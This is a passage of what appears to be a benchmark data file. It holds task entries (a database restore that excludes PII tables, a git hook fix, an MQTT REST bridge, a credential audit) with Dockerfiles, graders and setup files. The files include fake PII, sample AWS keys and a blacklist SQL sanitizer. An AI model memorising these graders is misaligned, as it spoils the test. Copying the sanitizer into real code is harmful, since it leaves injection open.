string   `protobuf:\""bytes,1,opt,name=status,proto3\"" json:\""status,omitempty\""`\n\tVersion              string   `protobuf:\""bytes,2,opt,name=version,proto3\"" json:\""version,omitempty\""`\n\tXXX_NoUnkeyedLiteral struct{} `json:\""-\""`\n\tXXX_unrecognized     []byte   `json:\""-\""`\n\tXXX_sizecache        int32    `json:\""-\""`\n}\n\nfunc (m *StatusResponse) Reset()         { *m = StatusResponse{} }\nfunc (m *StatusResponse) String() string { return proto.CompactTextString(m) }\nfunc (*StatusResponse) ProtoMessage()    {}\n\nfunc (m *StatusResponse) GetStatus() string {\n\tif m != nil {\n\t\treturn m.Status\n\t}\n\treturn \""\""\n}\n\nfunc (m *StatusResponse) GetVersion() string {\n\tif m != nil {\n\t\treturn m.Version\n\t}\n\treturn \""\""\n}\n\ntype DataRequest struct {\n\tData                 []byte   `protobuf:\""bytes,1,opt,name=data,proto3\"" json:\""data,omitempty\""`\n\tXXX_NoUnkeyedLiteral struct{} `json:\""-\""`\n\tXXX_unrecognized     []byte   `json:\""-\""`\n\tXXX_sizecache        int32    `json:\""-\""`\n}\n\nfunc (m *DataRequest) Reset()         { *m = DataRequest{} }\nfunc (m *DataRequest) String() string { return proto.CompactTextString(m) }\nfunc (*DataRequest) ProtoMessage()    {}\n\nfunc (m *DataRequest) GetData() []byte {\n\tif m != nil {\n\t\treturn m.Data\n\t}\n\treturn nil\n}\n\ntype DataResponse struct {\n\tProcessedCount       int32                `protobuf:\""varint,1,opt,name=processed_count,json=processedCount,proto3\"" json:\""processed_count,omitempty\""`\n\tTimestamp            *timestamp.Timestamp `protobuf:\""bytes,2,opt,name=timestamp,proto3\"" json:\""timestamp,omitempty\""`\n\tXXX_NoUnkeyedLiteral struct{}             `json:\""-\""`\n\tXXX_unrecognized     []byte               `json:\""-\""`\n\tXXX_sizecache        int32                `json:\""-\""`\n}\n\nfunc (m *DataResponse) Reset()         { *m = DataResponse{} }\nfunc (m *DataResponse) String() string { return proto.CompactTextString(m) }\nfunc (*DataResponse) ProtoMessage()    {}\n\nfunc (m *DataResponse) GetProcessedCount() int32 {\n\tif m != nil {\n\t\treturn m.ProcessedCount\n\t}\n\treturn 0\n}\n\nfunc (m *DataResponse) GetTimestamp() *timestamp.Timestamp {\n\tif m != nil {\n\t\treturn m.Timestamp\n\t}\n\treturn nil\n}\n\ntype ServiceClient interface {\n\tGetStatus(ctx context.Context, in *StatusRequest, opts ...grpc.CallOption) (*StatusResponse, error)\n\tProcessData(ctx context.Context, in *DataRequest, opts ...grpc.CallOption) (*DataResponse, error)\n}\n\ntype serviceClient struct {\n\tcc grpc.ClientConnInterface\n}\n\nfunc NewServiceClient(cc grpc.ClientConnInterface) ServiceClient {\n\treturn &serviceClient{cc}\n}\n\nfunc (c *serviceClient) GetStatus(ctx context.Context, in *StatusRequest, opts ...grpc.CallOption) (*StatusResponse, error) {\n\tout := new(StatusResponse)\n\terr := c.cc.Invoke(ctx, \""/proto.Service/GetStatus\"", in, out, opts...)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn out, nil\n}\n\nfunc (c *serviceClient) ProcessData(ctx context.Context, in *DataRequest, opts ...grpc.CallOption) (*DataResponse, error) {\n\tout := new(DataResponse)\n\terr := c.cc.Invoke(ctx, \""/proto.Service/ProcessData\"", in, out, opts...)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn out, nil\n}\n\ntype ServiceServer interface {\n\tGetStatus(context.Context, *StatusRequest) (*StatusResponse, error)\n\tProcessData(context.Context, *DataRequest) (*DataResponse, error)\n\tmustEmbedUnimplementedServiceServer()\n}\n\ntype UnimplementedServiceServer struct {\n}\n\nfunc (UnimplementedServiceServer) GetStatus(context.Context, *StatusRequest) (*StatusResponse, error) {\n\treturn nil, status.Errorf(codes.Unimplemented, \""method GetStatus not implemented\"")\n}\nfunc (UnimplementedServiceServer) ProcessData(context.Context, *DataRequest) (*DataResponse, error) {\n\treturn nil, status.Errorf(codes.Unimplemented, \""method ProcessData not implemented\"")\n}\nfunc (UnimplementedServiceServer) mustEmbedUnimplementedServiceServer() {}\n\ntype UnsafeServiceServer interface {\n\tmustEmbedUnimplementedServiceServer()\n}\n\nfunc RegisterServiceServer(s *grpc.Server, srv ServiceServer) {\n\ts.RegisterService(&_Service_serviceDesc, srv)\n}\n\nvar _Service_serviceDesc = grpc.ServiceDesc{\n\tServiceName: \""proto.Service\"",\n\tHandlerType: (*ServiceServer)(nil),\n\tMethods: []grpc.MethodDesc{\n\t\t{\n\t\t\tMethodName: \""GetStatus\"",\n\t\t\tHandler:    nil,\n\t\t},\n\t\t{\n\t\t\tMethodName: \""ProcessData\"",\n\t\t\tHandler:    nil,\n\t\t},\n\t},\n\tStreams:  []grpc.StreamDesc{},\n\tMetadata: \""proto/service.proto\"",\n}"", ""vendor/vendor.json"": ""{\n\t\""comment\"": \""\"",\n\t\""ignore\"": \""test\"",\n\t\""package\"": [\n\t\t{\n\t\t\t\""checksumSHA1\"": \""Y+HGqEkYM15ir+J93MEaHdyFy0c=\"",\n\t\t\t\""path\"": \""github.com/golang/protobuf/proto\"",\n\t\t\t\""revision\"": \""v1.2.0\"",\n\t\t\t\""revisionTime\"": \""2018-03-28T16:31:53Z\""\n\t\t},\n\t\t{\n\t\t\t\""checksumSHA1\"": \""d14p0KbpT8xW3JZl4dcCnz24oLs=\"",\n\t\t\t\""path\"": \""github.com/golang/protobuf/ptypes\"",\n\t\t\t\""revision\"": \""v1.2.0\"",\n\t\t\t\""revisionTime\"": \""2018-03-28T16:31:53Z\""\n\t\t},\n\t\t{\n\t\t\t\""checksumSHA1\"": \""lIbUN4A0bq8L5rBnBmJHtX56bZw=\"",\n\t\t\t\""path\"": \""github.com/golang/protobuf/ptypes/timestamp\"",\n\t\t\t\""revision\"": \""v1.2.0\"",\n\t\t\t\""revisionTime\"": \""2018-03-28T16:31:53Z\""\n\t\t},\n\t\t{\n\t\t\t\""checksumSHA1\"": \""GtamqiJoL7PGHsN454AoffBFMa8=\"",\n\t\t\t\""path\"": \""google.golang.org/grpc\"",\n\t\t\t\""revision\"": \""v1.10.0\"",\n\t\t\t\""revisionTime\"": \""2018-02-13T21:50:21Z\""\n\t\t},\n\t\t{\n\t\t\t\""checksumSHA1\"": \""5Ac22YMTBmrX/CXaEIXzWljr8UY=\"",\n\t\t\t\""path\"": \""google.golang.org/grpc/codes\"",\n\t\t\t\""revision\"": \""v1.10.0\"",\n\t\t\t\""revisionTime\"": \""2018-02-13T21:50:21Z\""\n\t\t},\n\t\t{\n\t\t\t\""checksumSHA1\"": \""bNqI9MiSIFl/UtGcN8M1G9/tRjY=\"",\n\t\t\t\""path\"": \""google.golang.org/grpc/status\"",\n\t\t\t\""revision\"": \""v1.10.0\"",\n\t\t\t\""revisionTime\"": \""2018-02-13T21:50:21Z\""\n\t\t}\n\t],\n\t\""rootPath\"": \""github.com/company/service\""\n}""}",2025-07-22T12:01:04.409696+00:00,2025-07-22T12:01:04.441271+00:00
draft_dp_56dddb10,hard,draft_dp_56dddb10,data-processing,"Need to restore only products, categories, and inventory tables from /backup/prod_dump.sql into a new 'restored_data' schema. Don't touch the audit_logs table and skip any tables with customer PII (customers, orders, payment_info).",data-processing,data-processing|sys-admin|security,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install PostgreSQL
RUN apt-get update && apt-get install -y \
    postgresql \
    postgresql-client \
    && rm -rf /var/lib/apt/lists/*

# Set up PostgreSQL
USER postgres
RUN /etc/init.d/postgresql start && \
    createdb testdb && \
    /etc/init.d/postgresql stop

USER root

# Create backup directory
RUN mkdir -p /backup

# Copy SQL files
COPY prod_dump.sql /backup/
COPY init_db.sql /tmp/

# Initialize database with audit_logs
RUN service postgresql start && \
    su - postgres -c ""psql testdb < /tmp/init_db.sql"" && \
    service postgresql stop && \
    rm /tmp/init_db.sql

# Set working directory
WORKDIR /workspace

# Start PostgreSQL on container start
CMD service postgresql start && tail -f /dev/null","import subprocess
import hashlib

def test_restored_tables_exist():
    """"""Test that the required tables exist in restored_data schema with correct data.""""""
    # Check if restored_data schema exists and contains the required tables
    cmd = """"""su - postgres -c ""psql -t testdb -c \\""SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'restored_data' AND table_name IN ('products', 'categories', 'inventory');\\"""" """"""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    assert result.returncode == 0
    table_count = int(result.stdout.strip())
    assert table_count == 3, f""Expected 3 tables in restored_data schema, found {table_count}""
    
    # Verify row counts match expected values
    expected_counts = {'products': 5, 'categories': 3, 'inventory': 5}
    for table, expected in expected_counts.items():
        cmd = f""""""su - postgres -c ""psql -t testdb -c \\""SELECT COUNT(*) FROM restored_data.{table};\\"""" """"""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        assert result.returncode == 0
        actual = int(result.stdout.strip())
        assert actual == expected, f""Table {table} has {actual} rows, expected {expected}""

def test_audit_logs_preserved_and_no_pii():
    """"""Test that audit_logs are preserved and no PII tables were restored.""""""
    # Check audit_logs still has 1M rows
    cmd = """"""su - postgres -c ""psql -t testdb -c \\""SELECT COUNT(*) FROM public.audit_logs;\\"""" """"""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    assert result.returncode == 0
    count = int(result.stdout.strip())
    assert count == 1000000, f""audit_logs has {count} rows, expected 1000000""
    
    # Ensure no PII tables exist in any schema
    pii_tables = ['customers', 'orders', 'payment_info']
    for table in pii_tables:
        cmd = f""""""su - postgres -c ""psql -t testdb -c \\""SELECT COUNT(*) FROM information_schema.tables WHERE table_name = '{table}';\\"""" """"""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        assert result.returncode == 0
        count = int(result.stdout.strip())
        assert count == 0, f""PII table '{table}' exists but should not""","{""test_restored_tables_exist"": 0.6, ""test_audit_logs_preserved_and_no_pii"": 0.4}","{""init_db.sql"": ""-- Initialize the database with audit_logs table\n\nCREATE TABLE IF NOT EXISTS public.audit_logs (\n    id SERIAL PRIMARY KEY,\n    event_type VARCHAR(100) NOT NULL,\n    user_id INTEGER,\n    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    details JSONB,\n    ip_address INET,\n    user_agent TEXT\n);\n\n-- Insert sample audit log data\nINSERT INTO public.audit_logs (event_type, user_id, timestamp, details, ip_address, user_agent)\nSELECT \n    CASE (random() * 3)::int\n        WHEN 0 THEN 'login'\n        WHEN 1 THEN 'data_access'\n        WHEN 2 THEN 'config_change'\n        ELSE 'logout'\n    END as event_type,\n    (random() * 1000)::int as user_id,\n    NOW() - (random() * INTERVAL '365 days') as timestamp,\n    jsonb_build_object(\n        'action', 'sample_action_' || generate_series,\n        'result', CASE WHEN random() > 0.1 THEN 'success' ELSE 'failure' END\n    ) as details,\n    ('192.168.' || (random() * 255)::int || '.' || (random() * 255)::int)::inet as ip_address,\n    'Mozilla/5.0 (compatible; audit_system/1.0)' as user_agent\nFROM generate_series(1, 1000000);\n\n-- Create index for performance\nCREATE INDEX idx_audit_logs_timestamp ON public.audit_logs(timestamp);\nCREATE INDEX idx_audit_logs_event_type ON public.audit_logs(event_type);"", ""prod_dump.sql"": ""--\n-- PostgreSQL database dump\n--\n\nSET statement_timeout = 0;\nSET lock_timeout = 0;\nSET idle_in_transaction_session_timeout = 0;\nSET client_encoding = 'UTF8';\nSET standard_conforming_strings = on;\nSET check_function_bodies = false;\nSET xmloption = content;\nSET client_min_messages = warning;\nSET row_security = off;\n\n--\n-- Name: public; Type: SCHEMA; Schema: -; Owner: postgres\n--\n\nCREATE SCHEMA IF NOT EXISTS public;\n\n--\n-- Table: products\n--\n\nCREATE TABLE public.products (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(255) NOT NULL,\n    price DECIMAL(10,2),\n    category_id INTEGER,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n--\n-- Data for products\n--\n\nCOPY public.products (id, name, price, category_id, created_at) FROM stdin;\n1\tLaptop Pro X1\t1299.99\t1\t2024-01-15 10:30:00\n2\tWireless Mouse\t29.99\t2\t2024-01-16 11:45:00\n3\tUSB-C Hub\t49.99\t2\t2024-01-17 09:20:00\n4\tGaming Keyboard\t89.99\t2\t2024-01-18 14:15:00\n5\tMonitor 27\""\t349.99\t1\t2024-01-19 16:30:00\n\\.\n\nSELECT pg_catalog.setval('public.products_id_seq', 5, true);\n\n--\n-- Table: categories\n--\n\nCREATE TABLE public.categories (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(100) NOT NULL,\n    description TEXT\n);\n\n--\n-- Data for categories\n--\n\nCOPY public.categories (id, name, description) FROM stdin;\n1\tElectronics\tElectronic devices and components\n2\tAccessories\tComputer and device accessories\n3\tSoftware\tSoftware licenses and subscriptions\n\\.\n\nSELECT pg_catalog.setval('public.categories_id_seq', 3, true);\n\n--\n-- Table: inventory\n--\n\nCREATE TABLE public.inventory (\n    product_id INTEGER PRIMARY KEY,\n    quantity INTEGER NOT NULL,\n    warehouse_location VARCHAR(50),\n    last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n--\n-- Data for inventory\n--\n\nCOPY public.inventory (product_id, quantity, warehouse_location, last_updated) FROM stdin;\n1\t45\tA-12-3\t2024-03-01 08:00:00\n2\t120\tB-05-7\t2024-03-01 08:00:00\n3\t87\tB-05-8\t2024-03-01 08:00:00\n4\t63\tC-10-2\t2024-03-01 08:00:00\n5\t22\tA-15-1\t2024-03-01 08:00:00\n\\.\n\n--\n-- Table: customers (PII - should not be restored)\n--\n\nCREATE TABLE public.customers (\n    id SERIAL PRIMARY KEY,\n    email VARCHAR(255) NOT NULL,\n    full_name VARCHAR(255),\n    phone VARCHAR(20),\n    address TEXT,\n    ssn VARCHAR(11)\n);\n\n--\n-- Data for customers\n--\n\nCOPY public.customers (id, email, full_name, phone, address, ssn) FROM stdin;\n1\tjohn.doe@email.com\tJohn Doe\t555-0123\t123 Main St, Anytown, USA\t123-45-6789\n2\tjane.smith@email.com\tJane Smith\t555-0124\t456 Oak Ave, Somewhere, USA\t987-65-4321\n3\tbob.wilson@email.com\tBob Wilson\t555-0125\t789 Pine Rd, Elsewhere, USA\t456-78-9012\n\\.\n\nSELECT pg_catalog.setval('public.customers_id_seq', 3, true);\n\n--\n-- Table: orders (PII - should not be restored)\n--\n\nCREATE TABLE public.orders (\n    id SERIAL PRIMARY KEY,\n    customer_id INTEGER REFERENCES public.customers(id),\n    order_date TIMESTAMP,\n    total_amount DECIMAL(10,2),\n    shipping_address TEXT\n);\n\n--\n-- Data for orders\n--\n\nCOPY public.orders (id, customer_id, order_date, total_amount, shipping_address) FROM stdin;\n1\t1\t2024-02-15 10:30:00\t1329.98\t123 Main St, Anytown, USA\n2\t2\t2024-02-16 14:20:00\t79.98\t456 Oak Ave, Somewhere, USA\n3\t3\t2024-02-17 09:15:00\t439.98\t789 Pine Rd, Elsewhere, USA\n\\.\n\nSELECT pg_catalog.setval('public.orders_id_seq', 3, true);\n\n--\n-- Table: payment_info (PII - should not be restored)\n--\n\nCREATE TABLE public.payment_info (\n    id SERIAL PRIMARY KEY,\n    customer_id INTEGER REFERENCES public.customers(id),\n    card_number VARCHAR(20),\n    card_holder_name VARCHAR(255),\n    expiry_date VARCHAR(7),\n    cvv VARCHAR(4)\n);\n\n--\n-- Data for payment_info\n--\n\nCOPY public.payment_info (id, customer_id, card_number, card_holder_name, expiry_date, cvv) FROM stdin;\n1\t1\t4111-1111-1111-1111\tJohn Doe\t12/2025\t123\n2\t2\t5500-0000-0000-0004\tJane Smith\t03/2026\t456\n3\t3\t3400-0000-0000-009\tBob Wilson\t07/2025\t789\n\\.\n\nSELECT pg_catalog.setval('public.payment_info_id_seq', 3, true);\n\n--\n-- Add foreign key constraints\n--\n\nALTER TABLE ONLY public.products\n    ADD CONSTRAINT products_category_id_fkey FOREIGN KEY (category_id) REFERENCES public.categories(id);\n\nALTER TABLE ONLY public.inventory\n    ADD CONSTRAINT inventory_product_id_fkey FOREIGN KEY (product_id) REFERENCES public.products(id);\n\n--\n-- PostgreSQL database dump complete\n--""}",2025-07-22T11:56:59.209676+00:00,2025-07-22T11:58:18.564318+00:00
draft_dp_7addb8d3,medium,draft_dp_7addb8d3,system-administration,"Git pre-commit hook is failing with ""Permission denied"". Need it fixed so our formatting checks run properly.",system-administration,git|python|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install git and black
RUN apt-get update && apt-get install -y git && \
    pip install black

# Copy Python files
COPY app.py /workspace/
COPY utils.py /workspace/

# Initialize git repository
RUN git init && \
    git config user.email ""dev@example.com"" && \
    git config user.name ""Developer""

# Create the .git/hooks directory
RUN mkdir -p .git/hooks

# Copy the pre-commit hook (without execute permissions)
COPY pre-commit /workspace/.git/hooks/pre-commit

# Add files to git
RUN git add -A && \
    git commit -m ""Initial commit"" --no-verify || true

# Stage app.py for testing commits
RUN echo ""# Modified"" >> app.py && \
    git add app.py

CMD [""/bin/bash""]","import subprocess
import os


def test_hook_executes_without_permission_error():
    """"""Test that git commit runs without permission denied error.""""""
    # Try to commit and check it doesn't fail with permission denied
    result = subprocess.run(
        ['git', 'commit', '-m', 'Test commit'],
        capture_output=True,
        text=True,
        cwd='/workspace'
    )
    
    # The hook should run (may fail for formatting, but not permissions)
    assert ""Permission denied"" not in result.stderr
    assert ""cannot exec"" not in result.stderr
    
    # Check that the hook actually executed (it should print something)
    output = result.stdout + result.stderr
    assert ""Running pre-commit formatting check"" in output or ""formatting"" in output.lower()


def test_hook_validates_formatting():
    """"""Test that the hook properly checks code formatting.""""""
    # First, ensure hook is executable
    os.chmod('/workspace/.git/hooks/pre-commit', 0o755)
    
    # Try to commit the badly formatted file
    result = subprocess.run(
        ['git', 'commit', '-m', 'Test commit'],
        capture_output=True,
        text=True,
        cwd='/workspace'
    )
    
    # Hook should reject the commit due to formatting issues
    assert result.returncode != 0
    output = result.stdout + result.stderr
    assert ""formatting"" in output.lower() or ""black"" in output.lower()","{""test_hook_executes_without_permission_error"": 0.6, ""test_hook_validates_formatting"": 0.4}","{""utils.py"": ""def add(a, b):\n    \""\""\""Add two numbers together.\""\""\""\n    return a + b\n\n\ndef multiply(a, b):\n    \""\""\""Multiply two numbers.\""\""\""\n    return a * b"", ""app.py"": ""def hello_world(  ):\n    x=1;y=2\n    return   x+y\n\n\ndef calculate( a,b ):\n    result=a+b\n    return result"", ""pre-commit"": ""#!/usr/bin/python3\n\nimport subprocess\nimport sys\n\ndef main():\n    print(\""Running pre-commit formatting check...\"")\n    \n    # Check Python files with black\n    result = subprocess.run(['black', '--check', '.'], capture_output=True, text=True)\n    \n    if result.returncode != 0:\n        print(\""ERROR: Code formatting issues found!\"")\n        print(result.stdout)\n        print(result.stderr)\n        sys.exit(1)\n    \n    print(\""All formatting checks passed!\"")\n    sys.exit(0)\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-22T15:04:21.138000+00:00,2025-07-22T15:04:21.173987+00:00
draft_dp_b6da5550,medium,draft_dp_b6da5550,software-engineering,"The weather station MQTT bridge isn't exposing the sensor data via HTTP. Need REST endpoints at port 5000 for /stations, /station/<id>/current, and /station/<id>/history.",software-engineering,api|python|networking,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install mosquitto MQTT broker
RUN apt-get update && apt-get install -y mosquitto mosquitto-clients && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Configure mosquitto
RUN echo ""listener 1883"" > /etc/mosquitto/mosquitto.conf && \
    echo ""allow_anonymous true"" >> /etc/mosquitto/mosquitto.conf

# Create mosquitto pid directory
RUN mkdir -p /run/mosquitto && \
    chown mosquitto:mosquitto /run/mosquitto

# Copy application files
COPY requirements.txt /app/
COPY mqtt_bridge.py /app/
COPY sensor_simulator.py /app/

# Install Python dependencies
RUN pip install -r requirements.txt

# Install requests for testing
RUN pip install requests

CMD [""bash""]","import subprocess
import json
import time
import requests

def test_mqtt_connection_and_data_collection():
    """"""Test that the service connects to MQTT broker and collects sensor data""""""
    # Give service time to collect some data
    time.sleep(5)
    
    # Check if we can query the stations endpoint
    try:
        response = requests.get(""http://localhost:5000/stations"", timeout=5)
        assert response.status_code == 200
        stations = response.json()
        
        # Should have collected data from at least one station
        assert isinstance(stations, list)
        assert len(stations) > 0
        
        # Verify each station has data
        for station_id in stations[:1]:  # Check at least one station
            current_response = requests.get(f""http://localhost:5000/station/{station_id}/current"", timeout=5)
            assert current_response.status_code == 200
            data = current_response.json()
            
            # Verify data structure
            assert ""temperature"" in data
            assert ""humidity"" in data
            assert ""pressure"" in data
            assert isinstance(data[""temperature""], (int, float))
            assert isinstance(data[""humidity""], (int, float))
            assert isinstance(data[""pressure""], (int, float))
            
    except requests.exceptions.RequestException:
        assert False, ""REST API is not accessible on port 5000""

def test_api_endpoints_return_sensor_data():
    """"""Test that all REST API endpoints return correct sensor data""""""
    # Get list of stations
    response = requests.get(""http://localhost:5000/stations"", timeout=5)
    assert response.status_code == 200
    stations = response.json()
    
    if len(stations) > 0:
        station_id = stations[0]
        
        # Test current endpoint
        current_response = requests.get(f""http://localhost:5000/station/{station_id}/current"", timeout=5)
        assert current_response.status_code == 200
        current_data = current_response.json()
        assert ""sensor_id"" in current_data or ""temperature"" in current_data
        
        # Test history endpoint
        history_response = requests.get(f""http://localhost:5000/station/{station_id}/history"", timeout=5)
        assert history_response.status_code == 200
        history_data = history_response.json()
        assert isinstance(history_data, list)
        
        # History should contain readings
        if len(history_data) > 0:
            assert ""temperature"" in history_data[0]
            assert ""humidity"" in history_data[0]
            assert ""pressure"" in history_data[0]

def test_error_handling():
    """"""Test that API returns proper error codes for invalid requests""""""
    # Test 404 for unknown station
    response = requests.get(""http://localhost:5000/station/unknown_station_xyz/current"", timeout=5)
    assert response.status_code == 404
    
    # Test 404 for unknown station history
    response = requests.get(""http://localhost:5000/station/unknown_station_xyz/history"", timeout=5)
    assert response.status_code == 404","{""test_mqtt_connection_and_data_collection"": 0.4, ""test_api_endpoints_return_sensor_data"": 0.4, ""test_error_handling"": 0.2}","{""requirements.txt"": ""Flask==3.0.0\npaho-mqtt==1.6.1"", ""sensor_simulator.py"": ""#!/usr/bin/env python3\nimport paho.mqtt.client as mqtt\nimport json\nimport time\nimport random\nimport threading\n\ndef simulate_sensor(sensor_id, client):\n    \""\""\""Simulate a weather sensor publishing data\""\""\""\n    while True:\n        data = {\n            \""sensor_id\"": sensor_id,\n            \""temperature\"": round(20 + random.uniform(-5, 5), 1),\n            \""humidity\"": round(50 + random.uniform(-20, 20), 1),\n            \""pressure\"": round(1013 + random.uniform(-10, 10), 1),\n            \""timestamp\"": int(time.time())\n        }\n        \n        topic = f\""sensors/{sensor_id}/weather\""\n        client.publish(topic, json.dumps(data))\n        time.sleep(random.uniform(2, 5))\n\ndef main():\n    # Create MQTT client\n    client = mqtt.Client()\n    \n    # Connect to broker\n    try:\n        client.connect(\""localhost\"", 1883, 60)\n        client.loop_start()\n        \n        # Start multiple sensor simulators\n        sensors = [\""station01\"", \""station02\"", \""station03\""]\n        threads = []\n        \n        for sensor_id in sensors:\n            thread = threading.Thread(target=simulate_sensor, args=(sensor_id, client))\n            thread.daemon = True\n            thread.start()\n            threads.append(thread)\n        \n        print(f\""Started {len(sensors)} weather sensor simulators\"")\n        \n        # Keep running\n        while True:\n            time.sleep(1)\n            \n    except KeyboardInterrupt:\n        print(\""\\nShutting down sensor simulators\"")\n        client.loop_stop()\n        client.disconnect()\n    except Exception as e:\n        print(f\""Error: {e}\"")\n\nif __name__ == \""__main__\"":\n    main()"", ""mqtt_bridge.py"": ""#!/usr/bin/env python3\nimport paho.mqtt.client as mqtt\nimport json\nimport time\nfrom collections import defaultdict, deque\nfrom datetime import datetime\nimport threading\n\nclass WeatherDataStore:\n    def __init__(self, history_size=100):\n        self.stations = defaultdict(lambda: {\""current\"": None, \""history\"": deque(maxlen=history_size)})\n        self.lock = threading.Lock()\n    \n    def add_reading(self, station_id, data):\n        with self.lock:\n            self.stations[station_id][\""current\""] = data\n            self.stations[station_id][\""history\""].append(data)\n    \n    def get_stations(self):\n        with self.lock:\n            return list(self.stations.keys())\n    \n    def get_current(self, station_id):\n        with self.lock:\n            if station_id in self.stations:\n                return self.stations[station_id][\""current\""]\n            return None\n    \n    def get_history(self, station_id, limit=10):\n        with self.lock:\n            if station_id in self.stations:\n                history = list(self.stations[station_id][\""history\""])\n                return history[-limit:] if len(history) > limit else history\n            return None\n\nclass MQTTWeatherBridge:\n    def __init__(self):\n        self.data_store = WeatherDataStore()\n        self.mqtt_connected = False\n        self.client = mqtt.Client()\n        self.setup_mqtt()\n    \n    def setup_mqtt(self):\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_disconnect = self.on_disconnect\n    \n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            print(\""Connected to MQTT broker\"")\n            self.mqtt_connected = True\n            client.subscribe(\""sensors/+/weather\"")\n        else:\n            print(f\""Failed to connect to MQTT broker: {rc}\"")\n            self.mqtt_connected = False\n    \n    def on_disconnect(self, client, userdata, rc):\n        print(\""Disconnected from MQTT broker\"")\n        self.mqtt_connected = False\n    \n    def on_message(self, client, userdata, msg):\n        try:\n            topic_parts = msg.topic.split('/')\n            if len(topic_parts) == 3 and topic_parts[0] == \""sensors\"" and topic_parts[2] == \""weather\"":\n                station_id = topic_parts[1]\n                data = json.loads(msg.payload.decode())\n                self.data_store.add_reading(station_id, data)\n        except Exception as e:\n            print(f\""Error processing message: {e}\"")\n    \n    def connect(self, host=\""localhost\"", port=1883):\n        try:\n            self.client.connect(host, port, 60)\n            self.client.loop_start()\n            return True\n        except Exception as e:\n            print(f\""Error connecting to MQTT broker: {e}\"")\n            return False\n    \n    def disconnect(self):\n        self.client.loop_stop()\n        self.client.disconnect()\n    \n    def is_connected(self):\n        return self.mqtt_connected""}",2025-07-22T15:08:17.114638+00:00,2025-07-22T15:09:33.137162+00:00
draft_dp_f700b95d,medium,draft_dp_f700b95d,security,"Audit the git repo at /repo for exposed credentials. Extract only commits with ""SEC-"" ticket numbers that don't contain secrets to /audit/approved-patches/ as patch files. Create a report at /audit/security-report.txt listing all commits with approval/rejection reasons.",security,git|security|python,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /

# Install git
RUN apt-get update && apt-get install -y git && rm -rf /var/lib/apt/lists/*

# Create audit directory structure
RUN mkdir -p /audit/approved-patches

# Copy the repository setup script and run it
COPY setup_repo.sh /tmp/
RUN chmod +x /tmp/setup_repo.sh && /tmp/setup_repo.sh && rm /tmp/setup_repo.sh

WORKDIR /","import os
import subprocess
import re

def test_safe_patches_extracted():
    """"""Test that all commits with SEC- tickets and no secrets have patch files.""""""
    # Expected safe commits: SEC-1234, SEC-2345, SEC-4567, SEC-5678
    # Not SEC-3456 (contains API token)
    expected_patches = ['SEC-1234', 'SEC-2345', 'SEC-4567', 'SEC-5678']
    
    patch_files = []
    if os.path.exists('/audit/approved-patches'):
        patch_files = os.listdir('/audit/approved-patches')
    
    # Check that we have patch files for all expected safe commits
    for sec_id in expected_patches:
        found = False
        for patch_file in patch_files:
            if sec_id in patch_file:
                found = True
                break
        assert found, f""Missing patch file for safe commit {sec_id}""
    
    # Verify we have exactly the right number of patches
    assert len(patch_files) == len(expected_patches), f""Expected {len(expected_patches)} patches, found {len(patch_files)}""

def test_security_report_created():
    """"""Test that security report exists and contains all commits with correct status.""""""
    assert os.path.exists('/audit/security-report.txt'), ""Security report not found""
    
    with open('/audit/security-report.txt', 'r') as f:
        report_content = f.read()
    
    # Check that all commits are mentioned in the report
    required_commits = [
        'SEC-1234',  # Should be approved
        'SEC-2345',  # Should be approved  
        'SEC-3456',  # Should be rejected (API token)
        'SEC-4567',  # Should be approved
        'SEC-5678',  # Should be approved
        'AWS configuration',  # Should be rejected
        'database connection',  # Should be rejected
        'deployment key'  # Should be rejected
    ]
    
    for commit_ref in required_commits:
        assert commit_ref in report_content, f""Commit reference '{commit_ref}' not found in report""
    
    # Verify rejected commits mention the type of credential
    assert re.search(r'AWS.*(?:key|secret|credential)', report_content, re.IGNORECASE), ""AWS credential rejection not properly documented""
    assert re.search(r'password', report_content, re.IGNORECASE), ""Password exposure not documented""
    assert re.search(r'(?:private key|ssh|RSA)', report_content, re.IGNORECASE), ""Private key exposure not documented""","{""test_safe_patches_extracted"": 0.6, ""test_security_report_created"": 0.4}","{""setup_repo.sh"": ""#!/bin/bash\n\n# Create repository\nmkdir -p /repo\ncd /repo\ngit init\ngit config user.email \""test@example.com\""\ngit config user.name \""Test User\""\n\n# Initial commit\necho \""# Security Audit Project\"" > README.md\ngit add README.md\ngit commit -m \""Initial commit\""\n\n# Commit 1: Security fix (safe)\ncat > auth.py << 'EOF'\ndef validate_token(token):\n    if not token:\n        return False\n    if len(token) < 32:\n        return False\n    return True\nEOF\ngit add auth.py\ngit commit -m \""SEC-1234: Add token validation to prevent empty tokens\""\n\n# Commit 2: Exposed AWS credentials (dangerous)\ncat > config.py << 'EOF'\nAWS_ACCESS_KEY = \""AKIAIOSFODNN7EXAMPLE\""\nAWS_SECRET_KEY = \""wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\""\nREGION = \""us-east-1\""\nEOF\ngit add config.py\ngit commit -m \""Add AWS configuration\""\n\n# Commit 3: Security fix (safe)\ncat > input_validator.py << 'EOF'\nimport re\n\ndef sanitize_sql_input(user_input):\n    dangerous_chars = [\""'\"", '\""', \"";\"", \""--\"", \""/*\"", \""*/\""]\n    for char in dangerous_chars:\n        user_input = user_input.replace(char, \""\"")\n    return user_input\nEOF\ngit add input_validator.py\ngit commit -m 